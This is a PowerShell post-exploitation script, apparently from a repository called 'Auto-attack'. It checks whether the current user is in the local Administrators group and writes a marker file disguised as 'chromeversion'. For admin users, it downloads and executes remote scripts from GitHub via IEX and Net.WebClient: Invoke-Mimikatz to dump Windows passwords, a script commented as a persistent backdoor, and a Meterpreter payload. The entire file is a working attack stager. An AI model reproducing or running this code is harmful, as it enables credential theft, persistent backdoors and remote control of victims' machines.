function getTMPPATH{
    $AppData = $env:LOCALAPPDATA
    if (Test-Path($AppData + "\Temp")){
        return $AppData + "\Temp"    
    }
    else {
        return $AppData
    }
}

$TMP = getTMPPATH

$isadmin = $TMP + '\chromeversion'
$Mimikatz = "https://raw.githubusercontent.com/zp1in/Auto-attack/master/auto-Mimikatz.ps1"
$meterpreter = "https://raw.githubusercontent.com/zp1in/Auto-attack/master/meterpreter.ps1"
$persistant = "https://raw.githubusercontent.com/zp1in/Auto-attack/master/persistant.ps1"
if ([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")){
    
    #admin authority
    Write-Host "Admin user now, Startin Invoke-Mimikatz"
    echo 1 > $isadmin

    #start getting winPass
    IEX(New-Object Net.WebClient).DownloadString($Mimikatz)

    #Persist backdoor
    if($persistant){
    IEX(New-Object Net.WebClient).DownloadString($persistant)
    }

    #IEX(New-Object Net.WebClient).DownloadString($persistant)
    if ($meterpreter){
    IEX(New-Object Net.WebClient).DownloadString($meterpreter)
    
}
}
else{
    #not a admin
    echo 0 > $isadmin
    }
